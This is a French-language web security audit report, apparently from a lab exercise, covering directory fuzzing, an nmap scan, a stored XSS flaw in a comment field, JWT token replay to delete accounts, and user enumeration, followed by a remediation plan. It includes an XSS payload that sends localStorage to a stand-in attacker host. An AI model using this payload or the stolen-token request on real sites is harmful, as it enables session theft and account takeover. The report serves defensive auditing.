# 🔒 Rapport d’Audit Cybersécurité — Vulnérabilités XSS & API  
**👥 Équipe** : LaDébauche  
**📅 Date** : 06/12/2025  
**🌐 Cible** : [http://10.33.70.223:8000](http://10.33.70.223:8000)

---

## 1. 📋 Contexte

L’équipe LaDébauche a réalisé un audit de sécurité sur l’application web cible. L’objectif était d’évaluer la sécurité des points d'entrée utilisateur, des communications réseau et de l’API.

---

## 2. 🧪 Tests Réalisés

### 🔍 Fuzzing de répertoires (`dirb`)
- **Commande** :
  ```bash
  dirb http://10.33.70.223:8000/
  ```
- **Résultats** :
  - ✅ `/index.html` (code 200)
  - 🔀 `/css` (code 301)
  - 🔀 `/icons` (code 301)
  - 🔀 `/javascript` (code 301)
- **Observation** :  
  Aucune ressource sensible ou d’administration détectée. Les seuls fichiers découverts sont publics ou liés à l’interface.

---

### 📡 Scan réseau (`nmap`)
- **Commande** :
  ```bash
  sudo nmap -sS -sV 10.33.70.223
  ```
- **Résultats** :
  ```
  PORT     STATE SERVICE VERSION
  3000/tcp open  http    Node.js Express framework
  8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.11.12)
  ```
- **Observation** :  
  Deux services web actifs :
  - `3000/tcp` → API ou interface Node.js Express
  - `8000/tcp` → Serveur HTTP Python (probablement pour les fichiers statiques)

---

## 3. ⚠️ Vulnérabilités identifiées

### 3.1 💥 Vulnérabilité XSS (Cross-Site Scripting stocké)
- **Localisation** : champ commentaire des stations
- **Payloads testés** :
  ```html
  <script>alert(1)</script>
  <script>
  fetch("http://attacker.oast.pro/capture?ls=" + JSON.stringify(localStorage))
  </script>
  ```
- **Données capturées** :
  ```json
  {
    "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "auth_user": "{"id":"683d6f...","email":"oui@oui.com","name":"Oui"}"
  }
  ```

#### 🎯 Impact :
- Exécution de JavaScript arbitraire
- Vol du `localStorage`
- Prise de contrôle de session

#### ✅ Recommandations :
- Filtrage des caractères spéciaux via regex :
  ```regex
  [<>{}()"'/;]
  ```
- Exemple Python :
  ```python
  import re
  def is_comment_valid(comment):
      return not bool(re.search(r'[<>{}()"'/;]', comment))
  ```
- CSP (Content Security Policy) stricte
- Sanitation via bibliothèques sécurisées (DOMPurify, bleach…)

---

### 3.2 🔓 Manipulation de l’API via token JWT
- **Accès au token** : via XSS
- **Scénarios testés** :
  - Suppression de compte via `/api/delete_account`
  - Modification via `/api/update_profile`

- **Exemple d’exploitation** :
  ```http
  DELETE /api/delete_account
  Authorization: Bearer <token_volé>
  ```

#### 🎯 Impact :
- Suppression non autorisée de compte
- Usurpation d'identité
- Modification de données sensibles

#### ✅ Recommandations :
- Cookies marqués `HttpOnly` et `Secure`
- Vérification du token par IP / User-Agent
- Confirmation via mot de passe ou 2FA avant suppression

---

### 3.3 🧠 Enumeration d’utilisateurs
- **Observation** : l’objet `auth_user` contient `email` et `name`
- **Exploitation** : récupération de comptes valides pour bruteforce

#### 🎯 Impact :
- Deviner des utilisateurs existants
- Bruteforce sur `/login` avec dictionnaire

#### ✅ Recommandations :
- Ne pas exposer d’infos sensibles côté client
- Limitation des tentatives (rate limiting)
- CAPTCHA / délai progressif
- Message d’erreur neutre :
  > ❌ "Identifiants incorrects"

---

## 4. 🛠️ Synthèse des Recommandations

| 🛑 Vulnérabilité                        | ✅ Remédiation principale                                  |
|----------------------------------------|------------------------------------------------------------|
| XSS dans les commentaires              | Sanitation côté serveur + regex + CSP                     |
| Token accessible depuis JS             | Cookie HttpOnly + validation côté back                    |
| Suppression API sans confirmation      | Double vérification (mot de passe, 2FA)                   |
| Enumeration utilisateur                | Masquage des infos + protection bruteforce                |

---

## 5. ✅ Conclusion

L’audit a révélé plusieurs vulnérabilités critiques :
- ❗ **XSS stocké** sur le champ commentaire
- ❗ **Exploitation de l’API** via token JWT volé
- ❗ **Enumeration des utilisateurs** facilitée par l’API

Des actions correctives urgentes sont recommandées pour sécuriser l’application, protéger les utilisateurs et limiter les vecteurs d’attaque potentiels.

---


## 🛡️ Plan de Sécurisation — Nouvelle Solution

### 📌 Objectif :
Corriger les failles identifiées (XSS, manipulation d’API, enumeration) et mettre en place un socle de sécurité robuste pour prévenir de futures attaques.

---

### 🧯 1. Mesures Correctives Immédiates

#### 🔐 1.1 Sanitation des entrées utilisateurs
- Mettre en place une validation côté **serveur** et **client** sur tous les champs de saisie.
- Exemple : filtrage regex sur les commentaires pour empêcher les balises `<script>`, etc.

#### 🛡️ 1.2 Protection contre le XSS
- Utiliser une **bibliothèque de sanitisation** :
  - Python : `bleach`
  - JavaScript : `DOMPurify`
- Ajouter une **Content Security Policy (CSP)** :
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
  ```

#### 🔑 1.3 Sécurisation des tokens
- Stocker le token JWT côté **cookie HttpOnly** au lieu de `localStorage`
- Activer l’attribut `Secure` si HTTPS est disponible
- Rafraîchir régulièrement les tokens (expiration courte + refresh token)

#### 🚫 1.4 Protection des actions critiques (ex : suppression de compte)
- Ajouter une **confirmation via mot de passe ou double validation (2FA)**
- Vérifier que le token JWT est bien émis pour l'IP et User-Agent actuel

---

### 🧱 2. Renforcements techniques de l’API

#### 🚪 2.1 Contrôle d’accès strict
- Vérifier que chaque endpoint est protégé par une authentification JWT robuste
- Éviter de faire confiance à des données côté client (nom, rôle, email...)

#### 📉 2.2 Limitation des tentatives de connexion
- Implémenter du **rate limiting** (ex: max 5 tentatives/minute par IP)
- Ajouter un **CAPTCHA** après plusieurs tentatives échouées

#### 🔍 2.3 Obfuscation des erreurs de login
- Ne jamais indiquer si l'email ou le mot de passe est incorrect :
  > ❌ "Identifiants incorrects" uniquement

#### 🕵️ 2.4 Minimiser l’exposition de données utilisateur
- Ne jamais exposer le contenu de `auth_user` (nom, email) côté client sans nécessité
- Réduire les champs retournés dans les payloads

---

### 🧠 3. Sécurité à long terme

#### 📚 3.1 Revue de code sécurisée
- Mettre en place des revues de code avec une checklist sécurité
- Ajouter des tests automatiques pour valider la non-régression des protections XSS et CSRF

#### 📊 3.2 Journalisation & alerte
- Journaliser les actions critiques (suppression de compte, changements sensibles)
- Déployer un système d’alerte en cas de comportement anormal

#### 🔁 3.3 Audit régulier
- Réaliser un **audit trimestriel** de la sécurité (automatisé + manuel)
- Scanner automatiquement les vulnérabilités (ZAP, Nikto, etc.)

---

### ✅ Résultat attendu

| Problème traité                        | Action mise en place                          |
|----------------------------------------|-----------------------------------------------|
| XSS dans commentaires                  | Regex + Sanitisation + CSP                    |
| JWT volé via XSS                       | Stockage sécurisé (`HttpOnly`)                |
| Suppression de compte sans vérification| 2FA / confirmation mot de passe               |
| Enumeration d’utilisateur              | Masquage infos + rate limiting + CAPTCHA      |

---
